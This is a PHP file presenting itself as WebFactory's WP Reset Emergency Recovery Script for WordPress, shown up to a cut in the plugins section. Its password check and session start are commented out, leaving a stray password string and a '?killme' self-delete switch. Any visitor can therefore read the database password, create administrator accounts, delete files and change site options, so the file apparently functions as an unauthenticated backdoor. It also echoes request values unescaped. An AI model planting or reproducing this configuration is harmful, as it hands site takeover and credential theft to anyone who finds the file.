<?php

#error_reporting(0);
#ini_set('error_log',NULL);
#@ini_set('log_errors',0);
#ini_set('max_execution_time',0);
#@ini_set('output_buffering',0);
#@ini_set('display_errors', 0);
#@error_reporting(E_ALL ^ E_NOTICE);

/* Emergency Recovery Script
 * (c) WebFactory Ltd, 2019 - 2021
 * This script is NOT free software. Any and all distribution without explicit permission by WebFactory is forbidden
 */

if (isset($_GET['killme']))
    {
        unlink(__FILE__);
		die("tools deleted OK!");
    }




#define('WPR_RECOVERY_PASS', 'yanz12345');
define('WPR_RECOVERY_VER', '1.35');

/** 
 FUNCTIONS
 */
class WPR_Emergency_Recovery
{
    private $wfdb;
    private $locale;
    private $wp_version;
    private $wp_config;
    private $table_prefix;
    private $active_plugins;
    private $active_theme;
    private $wp_config_path;
    private $dbname;
    private $dbuser;
    private $dbhost;
    private $dbpass;
    private $snapshots_folder = 'wp-reset-snapshots-export';
    private $autosnapshots_folder = 'wp-reset-autosnapshots';
    private $core_tables = array('commentmeta', 'comments', 'links', 'options', 'postmeta', 'posts', 'term_relationships', 'term_taxonomy', 'termmeta', 'terms', 'usermeta', 'users');
    private $pro_tools = array('core-files', 'snapshots', 'plugins', 'admin-account', 'wp-urls', 'manage-options');
    private $delete_count = 0;

    function __construct()
    {
        // User auth session
        ob_start();
		
        #session_start();
        $this->print_header();
        // Try to set variables, if anything fails we don't print any tools
        if ($this->setup_variables()) {

            // Do any requestion actions
            if (isset($_REQUEST['action'])) {

                switch ($_REQUEST['action']) {
                    case 'reinstall_core_files':
                        $this->reinstall_core_files();
                        break;
                    case 'delete_file':
                        $this->delete_file($_REQUEST['file']);
                        break;
                    case 'disable_plugins':
                        $this->update_option('active_plugins', array());
                        $this->reload('Plugins Disabled');
                        break;
                    case 'disable_plugin':
                        $plugin = urldecode($_REQUEST['plugin']);
                        if (($key = array_search($plugin, $this->active_plugins)) !== false) {
                            unset($this->active_plugins[$key]);
                        }
                        $this->update_option('active_plugins', $this->active_plugins);
                        $this->reload('Plugin Disabled');
                        break;
                    case 'activate_plugin':
                        $plugin = urldecode($_REQUEST['plugin']);
                        if (!in_array($plugin, $this->active_plugins)) {
                            $this->active_plugins[] = $plugin;
                        }
                        $this->update_option('active_plugins', $this->active_plugins);
                        $this->reload('Plugin Activated');
                        break;
                    case 'deactivate_theme':
                        $this->update_option('stylesheet', '');
                        $this->update_option('template', '');
                        $this->reload('Theme Disabled');
                        break;
                    case 'activate_theme':
                        $this->update_option('stylesheet', urldecode($_REQUEST['stylesheet']));
                        $this->update_option('template', urldecode($_REQUEST['template']));
                        $this->reload('Theme activated');
                        break;
                    case 'reset_user_prefix':
                        $this->reset_user_prefix();
                        break;
                    case 'admin_create':
                        $this->create_admin_user($_REQUEST['admin_user'], $_REQUEST['admin_pass']);
                        break;
                    case 'update_urls':
                        $this->update_option('siteurl', $_REQUEST['siteurl']);
                        $this->update_option('home', $_REQUEST['home']);
                        $this->reload('WordPress URLs updated');
                        break;
                    case 'reset_htaccess':
                        $this->reset_htaccess();
                        break;
                    case 'delete_htaccess':
                        $this->delete_htaccess();
                        break;
                    case 'disable_maintenance':
                        $this->disable_maintenance();
                        break;
                    case 'phpinfo':
                        ob_start();
                        phpinfo();
                        $info = ob_get_clean();
                        $matches = array();
                        preg_match('%(<style type="text/css">.*</style>).*<body>(.*)</body>%s', $info, $matches);
                        echo '<style type="text/css">
                        body {background-color: #fff; color: #222; font-family: sans-serif;}
                        pre {margin: 0; font-family: monospace;}
                        .php-info-section a:link {color: #009; text-decoration: none; background-color: #fff;}
                        .php-info-section a:hover {text-decoration: underline;}
                        .php-info-section table {border-collapse: collapse; border: 0; width: 100%; box-shadow: 1px 2px 3px #ccc;}
                        .center {text-align: center;}
                        .center table {margin: 1em auto; text-align: left;}
                        .center th {text-align: center !important;}
                        td, th {border: 1px solid #666; font-size: 75%; vertical-align: baseline; padding: 4px 5px;}
                        .php-info-section h1 {font-size: 150%;}
                        .php-info-section h2 {font-size: 125%;}
                        .p {text-align: left;}
                        .e {background-color: #ccf; width: 300px; font-weight: bold;}
                        .h {background-color: #99c; font-weight: bold;}
                        .v {background-color: #ddd; max-width: 300px; overflow-x: auto; word-wrap: break-word;}
                        .v i {color: #999;}
                        .php-info-section img {float: right; border: 0;}
                        .php-info-section hr {width: 934px; background-color: #ccc; border: 0; height: 1px;}
                        </style>';
                        echo '<a class="button" href="' . strtok('http://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'], '?') . '">Back</a>';
                        echo '<div class="php-info-section">';
                        print $matches[2];
                        echo '</div>';
                        $this->print_footer();
                        die();
                        break;
                    case 'restore_snapshot':
                        if (!isset($_GET['sid'])) {
                            $this->wpr_error('Unknown snapshot ID');
                        } else {
                            $this->restore_snapshot($_GET['sid']);
                        }
                        break;
                    case 'snapshot_upload':
                        $this->snapshot_upload();
                        break;
                    case 'wp_reset':
                        $this->do_wp_reset();
                        break;
                    case 'option_update':
                        $this->update_option_row($_REQUEST['option_id'], $_REQUEST['option_update'], $_REQUEST['option_value']);
                        $this->reload('Option ID <strong>' . $_REQUEST['option_id'] . '</strong> ' . $_REQUEST['option_update'] . ' changed to <strong>' . $_REQUEST['option_value'] . '</strong>');
                        break;
                    case 'option_add':
                        if(strlen($_REQUEST['option_name']) < 1){
                            $this->wpr_error('Can\'t add option with no name');
                        } else if($this->add_option($_REQUEST['option_name'], $_REQUEST['option_value'])){
                            $this->reload('Added option <strong>' . $_REQUEST['option_name'] . '</strong> with value <strong>' . $_REQUEST['option_value'] . '</strong>');
                        }
                        break;
                    case 'option_delete':
                        $this->delete_option($_REQUEST['option_id']);
                        $this->reload('Option ID <strong>' . $_REQUEST['option_id'] . '</strong> has been deleted');
                        break;
                }
            }

            // Print HTML

            echo '<h1>Emergency Recovery Script for<br>' . $this->get_option('blogname') . ' (<i>' . $this->get_option('home') . '</i>)</h1>';
			$this->print_section_admin_account();
            $this->print_section_toc();
            $this->print_section_wordpress_information();
            $this->print_section_server_information();
            $this->print_section_core_scanner();
            $this->print_section_reset_wordpress();
            $this->print_section_snapshots();
            $this->print_section_plugins();
            $this->print_section_themes();
            $this->print_section_manage_options();
            $this->print_section_user_privileges();
            $this->print_section_wp_urls();
            $this->print_section_reset_htaccess();
            $this->print_section_disable_maintenance();
        }
        $this->print_footer();
    }

    /**
     HTML Functions
     */

    function print_header()
    {
        echo '<html>';
        echo '<head>';
        echo '<title>WP Reset Emergency Recovery Script</title>';

        echo '<style type="text/css">
                html {
                    background: #f1f1f1;
                }
                body {
                    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen-Sans, Ubuntu, Cantarell, "Helvetica Neue", sans-serif;
                    margin: 2em auto;
                    max-width: 700px;
                }
                h1 {
                    border-bottom: 1px solid #555;
                    clear: both;
                    color: #555;
                    font-size: 25px;
                    margin: 30px 0 0 0;
                    padding: 0;
                    padding-bottom: 7px;
                    line-height: 1.5;
                    text-align: center;
                }
                h2 {
                    color: #555;
                    font-size: 20px;
                    margin: 30px 0 10px 0;
                }

                .card{
                    position: relative;
                    margin-top: 20px;
                    padding: .7em 2em 1em;
                    min-width: 255px;
                    border: 1px solid #ccd0d4;
                    box-shadow: 0 1px 1px rgb(0 0 0 / 4%);
                    background: #fff;
                    box-sizing: border-box;
                    padding: 0 25px 20px 25px;
                    max-width: 100%;
                    width: 100%;
                    margin: 0 0 35px 0;
                }
                
                .goto-toc {
                  text-decoration: none;
                  float: right;
                }
                
                #toc .goto-toc {
                  display: none;
                }

                .card-pro{
                    border: 1px solid #dd3036;
                }

                .card h2 {
                    border-bottom: 1px solid #e5e5e5;
                    margin: 0 -25px;
                    padding: 15px 25px;
                    background-color: #fcfcfc;
                }

                footer {
                    text-align: center;
                    margin: 30px 0 0 0;
                    padding: 10px;
                    width: 100%;
                    font-style: italic;
                    font-size: small;
                    box-sizing: border-box;
                }
                hr {
                    border: 0;
                    height: 1px;
                    background: #555;
                    margin: 15px 0;
                }
                p {
                    line-height: 1.4;
                }
                #error-page {
                    margin-top: 50px;
                }
                #error-page p {
                    font-size: 14px;
                    line-height: 1.5;
                    margin: 25px 0 20px;
                }
                #error-page code {
                    font-family: Consolas, Monaco, monospace;
                }
                ul li {
                    margin-bottom: 10px;
                    font-size: 14px ;
                }
                a {
                    color: #0073aa;
                }
                a:hover,
                a:active {
                    color: #00a0d2;
                }
                a:focus {
                    color: #124964;
                    -webkit-box-shadow:
                        0 0 0 1px #5b9dd9,
                        0 0 2px 1px rgba(30, 140, 190, 0.8);
                    box-shadow:
                        0 0 0 1px #5b9dd9,
                        0 0 2px 1px rgba(30, 140, 190, 0.8);
                    outline: none;
                }
                .button {
                    background: #f7f7f7;
                    border: 1px solid #ccc;
                    color: #555;
                    display: inline-block;
                    text-decoration: none;
                    font-size: 13px;
                    line-height: 26px;
                    height: 28px;
                    margin: 0;
                    padding: 0 10px 1px;
                    cursor: pointer;
                    -webkit-border-radius: 3px;
                    -webkit-appearance: none;
                    border-radius: 3px;
                    white-space: nowrap;
                    -webkit-box-sizing: border-box;
                    -moz-box-sizing:    border-box;
                    box-sizing:         border-box;

                    -webkit-box-shadow: 0 1px 0 #ccc;
                    box-shadow: 0 1px 0 #ccc;
                    vertical-align: top;
                    margin-right: 4px;
                }

                .button.button-large {
                    height: 30px;
                    line-height: 28px;
                    padding: 0 12px 2px;
                }

                .button:hover,
                .button:focus {
                    background: #fafafa;
                    border-color: #999;
                    color: #23282d;
                }

                .button:focus {
                    border-color: #5b9dd9;
                    -webkit-box-shadow: 0 0 3px rgba(0, 115, 170, 0.8);
                    box-shadow: 0 0 3px rgba(0, 115, 170, 0.8);
                    outline: none;
                }

                .button:active {
                    background: #eee;
                    border-color: #999;
                    -webkit-box-shadow: inset 0 2px 5px -3px rgba(0, 0, 0, 0.5);
                    box-shadow: inset 0 2px 5px -3px rgba(0, 0, 0, 0.5);
                    -webkit-transform: translateY(1px);
                    -ms-transform: translateY(1px);
                    transform: translateY(1px);
                }

                .notice {
                    background: #f8fdff;
                    border: 1px solid #03A9F4;
                    color: #23282e;
                    padding: 10px;
                    border-left: 5px solid #03A9F4;
                    margin: 6px 0;
                }

                .error{
                    background: #fff5f5;
                    border: 1px solid #d84040;
                    color: #23282e;
                    padding: 10px;
                    border-left: 5px solid #d84040; 
                    margin: 6px 0;
                }

                .red{
                    color:#dc3339;
                }

                table td {
                    padding: 5px 15px 5px 0;
                }

                input {
                    padding: 5px;
                }

                ul.toc {
                    -moz-column-count: 2;
                    -moz-column-gap: 20px;
                    -webkit-column-count: 2;
                    -webkit-column-gap: 20px;
                    column-count: 2;
                    column-gap: 20px;
                }

                ul.toc li{
                    list-style: circle;
                    font-size: 16px;
                }
                ul.toc a{
                    text-decoration:none;
                }

                .pro-feature {
                    font-weight: normal;
                    font-variant: small-caps;
                    font-style: italic;
                    color: inherit;
                    text-decoration: none;
                    margin-left: 4px;
                    font-size: 12px;
                }

                .pro-feature .pro, .pro-feature.pro-feature-text span {
                    font-weight: 700;
                    color: #dd3036;
                }

                #wpr-free-promo,
                #delete_option_popup {
                    display: none;
                    position: fixed;
                    top: 50%;
                    left: 50%;
                    width: 100%;
                    max-width: 500px;
                    background: #FFF;
                    height: auto;
                    z-index: 99999;
                    box-shadow: 1px 1px 1px 2000px #00000052;
                    border-radius: 2px;
                    padding: 20px;
                    box-sizing: border-box;
                    transform: translate(-50%, -50%);
                }

                .pro-close,
                .delete-option-close{
                    position: absolute;
                    top: -10px;
                    right: -10px;
                    width: 20px;
                    height: 20px;
                    background: #333;
                    text-align: center;
                    padding: 4px;
                    font-size: 30px;
                    line-height: 14px;
                    border-radius: 20px;
                    color: #FFF;
                }

                .pro-close:hover,
                .delete-option-close:hover{
                    background:#555;
                    cursor:pointer;
                }

                .manage-options{
                    width:100%;
                }

                .manage-options td {
                    word-break: break-word;
                    border-bottom: 1px solid #d5d5d5;
                    padding: 6px 10px;
                }

                .manage-options tr td:first-child {
                    width: 200px;
                    vertical-align: text-bottom;
                    border-right: 1px solid #d5d5d5;
                }

                .option_edit textarea{
                    width:100%;
                    height:100px;
                }

                .option_edit{
                    display:none;
                }

                .option_edit_button,
                .option_delete_button{
                    cursor:pointer;
                    vertical-align: text-bottom;
                    line-height: 20px;
                }

                .option_actions .option_edit_button{
                    font-size:20px;
                    margin-right: 10px;
                }

                .option_edit_button:hover,
                .option_delete_button:hover{
                    opacity:0.8;
                }

                .option_actions{
                    display:inline-block;
                }

                .option_actions div{
                    display:inline-block;
                }

                .option_cutoff {
                    color: #a2a2a2;
                    padding-left: 10px;
                }

                #delete_option_popup_html{
                    text-align:center;
                }

                #delete_option_popup_html .button{
                    margin-top:20px;
                }

                #delete_option_popup_html form{
                    margin:0;
                }

                .manage-options tr td.search-no-results{
                    border:none;
                    color:#a2a2a2;
                }
                </style>';
        echo '</head>';

        if (defined('WPR_FREE') && WPR_FREE) {
            echo '<body class="ers-free">';
        } else {
            echo '<body>';
        }

        echo '<script>
        if(window.location.search.length > 5){
            history.pushState({
                id: "ERS"
            }, "WP Reset Emergency Recovery Script", window.location.href.replace(window.location.search,\'\'));
        }


        </script>';

        echo '<div style="text-align: center;"><img width="180" src="https://wpreset.com/app/wp-content/uploads/2018/05/wp-reset-logo.png" /></div>';

        if (isset($_REQUEST['message'])) {
            echo '<div class="notice">' . urldecode($_REQUEST['message']) . '</div>';
        }
    }

    function print_section($id, $title, $html)
    {
        echo '<div class="card' . (defined('WPR_FREE') && WPR_FREE && in_array($id, $this->pro_tools) ? ' card-pro' : '') . '">';
        echo '<h2 id="' . $id . '">' . $title .  (defined('WPR_FREE') && WPR_FREE && in_array($id, $this->pro_tools) ? '<a data-feature="tool-reset-user-roles" class="pro-feature tooltip tooltipstered" href="#" style="opacity: 1;"><span class="pro">PRO</span> tool</a>' : '');
        echo  '<a class="goto-toc" href="#toc" title="Go to list of tools">&UpArrow;</a></h2>';
        echo '<div class="card-body">';
        echo $html;
        echo '</div>';
        echo '</div>';
    }

    function print_section_toc()
    {
        $html = '';
        $html .= '<ul class="toc">';
        $html .= '<li><a href="#wordpress-information">WordPress Information</a></li>';
        $html .= '<li><a href="#server-information">Server Information</a></li>';
        $html .= '<li><a href="#core-files">Core Scanner</a>' . (defined('WPR_FREE') && WPR_FREE ? '<a data-feature="tool-reset-user-roles" class="pro-feature tooltip tooltipstered" href="#" style="opacity: 1;"><span class="pro">PRO</span> tool</a>' : '') . '</li>';
        $html .= '<li><a href="#wp-do-reset">Reset WordPress</a></li>';
        $html .= '<li><a href="#snapshots">Snapshots</a>' . (defined('WPR_FREE') && WPR_FREE ? '<a data-feature="tool-reset-user-roles" class="pro-feature tooltip tooltipstered" href="#" style="opacity: 1;"><span class="pro">PRO</span> tool</a>' : '') . '</li>';
        $html .= '<li><a href="#plugins">Plugins</a>' . (defined('WPR_FREE') && WPR_FREE ? '<a data-feature="tool-reset-user-roles" class="pro-feature tooltip tooltipstered" href="#" style="opacity: 1;"><span class="pro">PRO</span> tool</a>' : '') . '</li>';
        $html .= '<li><a href="#themes">Themes</a></li>';
        $html .= '<li><a href="#manage-options">Options</a>' . (defined('WPR_FREE') && WPR_FREE ? '<a data-feature="tool-manage-options" class="pro-feature tooltip tooltipstered" href="#" style="opacity: 1;"><span class="pro">PRO</span> tool</a>' : '') . '</li>';
        $html .= '<li><a href="#user-privileges">User Privileges & Roles</a></li>';
        $html .= '<li><a href="#admin-account">Create Administrator Account</a>' . (defined('WPR_FREE') && WPR_FREE ? '<a data-feature="tool-reset-user-roles" class="pro-feature tooltip tooltipstered" href="#" style="opacity: 1;"><span class="pro">PRO</span> tool</a>' : '') . '</li>';
        $html .= '<li><a href="#wp-urls">WordPress URLs</a>' . (defined('WPR_FREE') && WPR_FREE ? '<a data-feature="tool-reset-user-roles" class="pro-feature tooltip tooltipstered" href="#" style="opacity: 1;"><span class="pro">PRO</span> tool</a>' : '') . '</li>';
        $html .= '<li><a href="#wp-do-reset-htaccess">Delete/Reset .htaccess</a></li>';
        $html .= '<li><a href="#wp-disable-maintenance">Disable WordPress Maintenance Mode</a></li>';
        $html .= '</ul>';

        $this->print_section('toc', 'Emergency Recovery Tools', $html);
    }

    function print_section_server_information()
    {
        $html = '';
        $html .= '<table>';
        $html .= '<tr><td>Operating System:<td></td><td>' . php_uname('s') . '</td></tr>';
        $html .= '<tr><td>Server IP:<td></td><td>' . $_SERVER['SERVER_ADDR'] . '</td></tr>';
        $html .= '<tr><td>Server Hostname:<td></td><td>' . php_uname('n') . '</td></tr>';
        $html .= '<tr><td>Server Protocol:<td></td><td>' . $_SERVER['SERVER_PROTOCOL'] . '</td></tr>';
        $html .= '<tr><td>Server Administrator:<td></td><td>' . $_SERVER['SERVER_ADMIN'] . '</td></tr>';
        $html .= '<tr><td>Server Web Port:<td></td><td>' . $_SERVER['SERVER_PORT'] . '</td></tr>';
        $html .= '<tr><td>PHP Version:<td></td><td>' . phpversion() . ' ( <a href="?action=phpinfo">view phpinfo</a> )</td></tr>';
        $html .= '<tr><td>MySQL Version:<td></td><td>' . mysqli_get_server_info($this->wfdb) . '</td></tr>';
        $html .= '</table>';

        $this->print_section('server-information', 'Server Information', $html);
    }

    function print_section_manage_options()
    {
        if(isset($_POST['options_search'])){
            $search_query = 'SELECT * FROM ' . $this->table_prefix . 'options WHERE option_name LIKE ? OR option_value LIKE ? LIMIT 100';
            $search = $this->wfdb->prepare($search_query); 
            $search_option_value = '%' . $_POST['options_search'] . '%';
            $search->bind_param("ss", $search_option_value, $search_option_value);
            $search->execute();
            $result = $search->get_result();
            while ($row = $result->fetch_assoc()) {
                $options[] = $row;
            }
        } else {
            $options = $this->wfdb_get_results('SELECT * FROM ' . $this->table_prefix . 'options LIMIT 100');
        }
        
        $html = '';
        $html .= '<p>
        <form method="POST" action="' . $this->get_current_url() . '">
        <label for="manage_options_search">Add option:</label>
        <input type="text" name="option_name" value="" placeholder="Option Name" />
        <input type="text" name="option_value" value="" placeholder="Option Value" />
        <input type="hidden" name="action" value="option_add" />';
        if (defined('WPR_FREE') && WPR_FREE) {
            $html .= '<a class="button button-pro-feature" href="#">Add Option</a>';
        } else {
            $html .= '<input class="button" type="submit" name="option_submit" value="Add Option" />';
        }
        $html .= '</form>
        </p>';

        $html .= '<p>
        <form id="search_form" method="POST" action="' . $this->get_current_url() . '#manage-options">
            <label for="options_search">Search options by name or value:</label> 
            <input type="text" id="options_search" name="options_search" value="' . (isset($_POST['options_search']) ? $_POST['options_search'] : '') . '" />
            <input type="submit" class="button" name="option_submit" value="Search" />
            <div class="button" id="search_clear">Clear</div>
        </form>
        </p>';

        $html .= '<script>';
        $html .= 'document.addEventListener("DOMContentLoaded", function() {
            document.getElementById("options_search").addEventListener("keyup", function(event) {
                if (event.code === "Enter")
                {
                    event.preventDefault();
                    document.getElementById("search_form").submit();
                }
            });

            document.getElementById("search_clear").addEventListener("click", function(event) {
                document.getElementById("options_search").value = "";
                document.getElementById("search_form").submit();
            });
            
            var options_edit_button = document.getElementsByClassName("option_edit_button");
            for (i = 0; i < options_edit_button.length; i++) {
                options_edit_button[i].addEventListener("click", function (e) {
                    edit_click(e);
                });
            }

            var options_edit_cancel_button = document.getElementsByClassName("option_edit_cancel");
            for (i = 0; i < options_edit_cancel_button.length; i++) {
                options_edit_cancel_button[i].addEventListener("click", function (e) {
                    var parent = e.target.parentElement.parentElement.parentElement;
                    parent.querySelector(".option_html").style.display = "block";
                    parent.querySelector(".option_edit").style.display = "none";
                });
            }
        }, false);
        
        function edit_click(e){
            var parent = e.target.parentElement.parentElement.parentElement;
            option_edit_all_elements = document.getElementsByClassName("option_edit");
            for (var i = 0; i < option_edit_all_elements.length; i++) {
                option_edit_all_elements[i].style.display="none";
            }
            option_html_all_elements = document.getElementsByClassName("option_html");
            for (var i = 0; i < option_html_all_elements.length; i++) {
                option_html_all_elements[i].style.display="block";
            }
            parent.querySelector(".option_html").style.display = "none";
            parent.querySelector(".option_edit").style.display = "block";
        }';
        $html .= '</script>';


        $html .= '<table id="manage_options_table" class="manage-options">';
        if(empty($options)){
            $html .= '<tr><td colspan="2" class="search-no-results">No options found matching your search</td></tr>';
        } else {
            foreach ($options as $option) {
                $html .= '<tr>';

                $html .= '<td>';
                $html .= '<div class="option_html">';
                    $html .= '<div class="option_actions">';
                    $html .= '<div class="option_edit_button" title="Edit option name">&#x270E;</div>';
                    $html .= '</div>';
                    $option_name = htmlentities($option['option_name'], ENT_IGNORE);
                    if(strlen($option_name)>200){
                        $html .= substr($option_name, 0, 200) . '<span class="option_cutoff"><span class="option_edit_button">... ( ' . (strlen($option_name) - 200) . ' more characters)</span></span>';
                    } else {
                        $html .= $option_name;
                    }
                $html .= '</div>';
                $html .= '<div class="option_edit"><form method="POST" action="' . $this->get_current_url() . '">';
                    $html .= '<textarea name="option_value">' . $option['option_name'] . '</textarea>';
                    $html .= '<input type="hidden" name="option_update" value="name" />';
                    $html .= '<input type="hidden" name="option_id" value="' . $option['option_id'] . '" />';
                    $html .= '<input type="hidden" name="action" value="option_update" />';
                    $html .= '<input class="button button-pro-feature" type="submit" name="option_submit" value="Update" />';
                    $html .= '<div class="button option_edit_cancel">Cancel</div>';
                $html .= '</form></div>';
                $html .= '</td>';

                $html .= '<td>';
                $html .= '<div class="option_html">';
                    $html .= '<div class="option_actions">';
                    $html .= '<div class="option_edit_button" title="Edit option value">&#x270E;</div>';
                    $html .= '</div>';
                    $option_value = htmlentities($option['option_value'], ENT_IGNORE);
                    if(strlen($option_value)>200){
                        $html .= substr($option_value, 0, 200) . '<span class="option_cutoff"><span class="option_edit_button">... ( ' . (strlen($option_value) - 200) . ' more characters)</span></span>';
                    } else {
                        $html .= $option_value;
                    }
                $html .= '</div>';
                $html .= '<div class="option_edit"><form method="POST" action="' . $this->get_current_url() . '">';
                    $html .= '<textarea name="option_value">' . $option['option_value'] . '</textarea>';
                    $html .= '<input type="hidden" name="option_update" value="value" />';
                    $html .= '<input type="hidden" name="option_id" value="' . $option['option_id'] . '" />';
                    $html .= '<input type="hidden" name="action" value="option_update" />';
                    $html .= '<input class="button button-pro-feature" type="submit" name="option_submit" value="Update" />';
                    $html .= '<div class="button option_edit_cancel">Cancel</div>';
                $html .= '</form></div>';
                $html .= '</td>';
                $html .= '<td valign="top">';
                $html .= '<div class="option_actions">';
                if (defined('WPR_FREE') && WPR_FREE) {
                $html .= '<div class="button-pro-feature option_delete_button" title="Delete option">&#10060;</div>';
                } else {
                $html .= '<div class="option_delete_button delete-option" data-option_id="' . $option['option_id'] . '" title="Delete option">&#10060;</div>';
                }
                $html .= '</div>';
                $html .= '</td>';
                $html .= '</tr>';
            }
        }
        $html .= '';
        $html .= '</table>';

        $html .= '<div id="delete_option_popup">';
        $html .= '<div class="delete-option-close">&times;</div>';
        $html .= '<form method="POST" action="' . $this->get_current_url() . '">';
        $html .= '<div id="delete_option_popup_html">';

        $html .= '</div>';

        $html .= '</form>';
        $html .= '</div>';

        $html .= '</div>';
        $html .= '<script>
        window.onload = function() {
            var open_delete_option = function (event) {
                if (!event.target.matches(".delete-option")) return;
                var delete_option_popup_html = document.getElementById("delete_option_popup_html");
                delete_option_popup_html_print = "";
                delete_option_popup_html_print += "Are you sure you want to delete option " + event.target.dataset.option_id + "?";
                delete_option_popup_html_print += "<input type=\"hidden\" name=\"option_id\" value=\"" + event.target.dataset.option_id + "\" />";
                delete_option_popup_html_print += "<input type=\"hidden\" name=\"action\" value=\"option_delete\" />";
                delete_option_popup_html_print += "<br /><input class=\"button\" type=\"submit\" name=\"option_submit\" value=\"Delete Option\" />";
                delete_option_popup_html.innerHTML = delete_option_popup_html_print;
                event.preventDefault();
                document.getElementById("delete_option_popup").style.display = "block";
                document.addEventListener("click", close_delete_option, true);
            };
            
            document.addEventListener("click", open_delete_option, false);

            var close_delete_option = function (event) {
                if (event.target.matches(".delete_option_popup")) return;
                var isClickInside = document.getElementById("delete_option_popup").contains(event.target);
                if(event.target.matches(".delete-option-close")){
                    isClickInside = false;
                }
                if (!isClickInside) {
                    document.removeEventListener("click", close_delete_option, true);
                    document.getElementById("delete_option_popup").style.display = "none";
                }
            }
        }
        </script>';

        $this->print_section('manage-options', 'Options', $html);
    }

    function print_section_wordpress_information()
    {
        $html = '';
        $html .= '<table>';
        $html .= '<tr><td>WordPress wp-config path:<td></td><td>' . $this->wp_config_path . '</td></tr>';
        $html .= '<tr><td>WordPress directory:<td></td><td>' . ABSPATH . '</td></tr>';
        $html .= '<tr><td>WordPress Version:<td></td><td>' . $this->wp_version . '</td></tr>';

        $html .= '<tr><td>Home URL:<td></td><td>' . $this->get_option('home') . '</td></tr>';
        $html .= '<tr><td>Site URL:<td></td><td>' . $this->get_option('siteurl') . '</td></tr>';

        $html .= '<tr><td>Database user:<td></td><td>' . $this->dbuser . '</td></tr>';
        $html .= '<tr><td>Database password:<td></td><td>' . $this->dbpass . '</td></tr>';
        $html .= '<tr><td>Database host:<td></td><td>' . $this->dbhost . '</td></tr>';
        $html .= '<tr><td>Database name:<td></td><td>' . $this->dbname . '</td></tr>';
        $html .= '<tr><td>Database prefix:<td></td><td>' . $this->table_prefix . '</td></tr>';

        $html .= '</table>';

        $this->print_section('wordpress-information', 'WordPress Information', $html);
    }

    function print_section_core_scanner()
    {
        $html = '';
        $html .= '<p>Core files can be compromised in many ways, by accidental delete or edit, or by malicious software. If WordPress is reporting that some files are missing, this is the tool to use.<br>
                The tool scans all your core files and compares them to the master version found on wp.org. If any file is modified, you\'ll be able to recover it to its original state.<br>
                You will also be alerted if any unknown files are present in your core WP folders.</p>';

        if(!isset($_POST['options_search'])){
            $scan_result = $this->scan_files();
        } else {
        $scan_result = [];
            $scan_result['missing_bad'] = [];
            $scan_result['changed_bad'] = [];
            $scan_result['unknown_bad'] = [];
        }
        $html .= '<strong>Core Files status for WP v' . $this->wp_version . ':</strong><br />';

        if (count($scan_result['missing_bad'])) {
            $html .= '<strong>The following core files are missing:</strong>';
            $html .= '<table>';
            foreach ($scan_result['missing_bad'] as $result) {
                $html .= '<tr><td>' . $result . '</td></tr>';
            }
            $html .= '</table>';
        }

        if (count($scan_result['changed_bad'])) {
            $html .= '<strong>The following WordPress core files have been modified:</strong>';
            $html .= '<table>';
            foreach ($scan_result['changed_bad'] as $result) {
                $html .= '<tr><td>' . $result . '</td></tr>';
            }
            $html .= '</table>';
        }

        if (count($scan_result['unknown_bad'])) {
            $html .= '<strong>The following files are unknown and should not be in your core folders:</strong>';
            $html .= '<table>';
            foreach ($scan_result['unknown_bad'] as $result) {
                if (defined('WPR_FREE') && WPR_FREE) {
                    $html .= '<tr><td>' . $result . ' <a class="button-pro-feature" href="#">(delete file)</a></td></tr>';
                } else {
                    $html .= '<tr><td>' . $result . ' <a class="red" href="?action=delete_file&file=' . urlencode($result) . '">(delete file)</a></td></tr>';
                }
            }
            $html .= '</table>';
        }

        if(isset($_POST['options_search'])){
            $html .= '<span class="green">Click Rescan Core Files to see results</span><br />';
        } else if (count($scan_result['missing_bad']) == 0 && count($scan_result['changed_bad']) == 0 && count($scan_result['unknown_bad']) == 0) {
            $html .= '<span class="green">All core files are in order!</span><br />';
        }

        if (is_writable(ABSPATH . 'wp-includes')) {
            if (defined('WPR_FREE') && WPR_FREE) {
                $html .= '<br /><a class="button button-pro-feature" href="#">Reinstall All Core Files</a>';
            } else {
                $html .= '<br /><a class="button" href="?action=reinstall_core_files">Reinstall All Core Files</a>';
            }
        } else {
            $html .= '<br />It looks like your WordPress core files are not writable, so we can\'t reinstall them.';
        }

        $html .= '<a class="button" href="' . strtok('http://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'], '?') . '">Rescan Core Files</a>';

        $this->print_section('core-files', 'Core Files', $html);
    }

    function print_section_themes()
    {
        $html = '';
        $html .= '<p>If you are unable to switch themes or you experience any problems after activating a theme, deactivate it. It\'s the least aggressive way to detect and fix all problems caused by problematic themes.<br>';
        $html .= 'In case you\'re getting the white screen of death, deactivating a theme is the best way to rule it out as the cause of the problem.</p>';

        if (is_dir(WPR_WPCONTENT . '/themes/')) {
            $themes = array();
            $scan_themes = scandir(WPR_WPCONTENT . '/themes/');
            foreach ($scan_themes as $theme) {
                if (!(strpos($theme, '.') === 0)  && is_dir(ABSPATH . 'wp-content/themes/' . $theme) && file_exists(WPR_WPCONTENT . '/themes/' . $theme . '/style.css')) {
                    $themes[$theme] = $this->get_theme_headers(WPR_WPCONTENT . '/themes/' . $theme . '/style.css');
                }
            }
            $html .= '<table>';
            foreach ($themes as $theme_slug => $theme) {
                $html .= '<tr>';
                $html .= '<td>';
                $html .= $theme['Name'] . '</td>';

                $html .= '<td>';
                if ($theme_slug == $this->active_theme) {
                    $html .= '<a class="button button-red" href="?action=deactivate_theme">Deactivate theme</a>';
                } else {
                    $html .= '<a class="button button-primary" href="?action=activate_theme&stylesheet=' . urlencode($theme_slug) . '&template=' . (!empty($theme['Template']) ? urlencode($theme['Template']) : urlencode($theme_slug)) . '">Activate theme</a>';
                }
                $html .= '</td>';
                $html .= '</tr>';
            }
            $html .= '</table>';
        }

        $this->print_section('themes', 'Themes', $html);
    }

    function print_section_plugins()
    {
        $html = '';
        $html .= '<table>';
        $html .= '<p>If you are unable to deactivate a plugin or you experience any problems after activating a plugin, deactivate it. It\'s the least aggressive  way to detect and fix all problems caused by problematic plugins.<br>';
        $html .= 'In case you\'re getting the white screen of death, deactivating all plugins is the best way to rule out plugins as the cause of the problem.</p>';

        $plugins = $this->get_plugins(WPR_WPCONTENT . '/plugins/');

        $html .= '<table>';
        foreach ($plugins as $plugin_path => $plugin) {
            $html .= '<tr>';
            $html .= '<td>' . $plugin['Name'] . '</td>';

            $html .= '<td>';
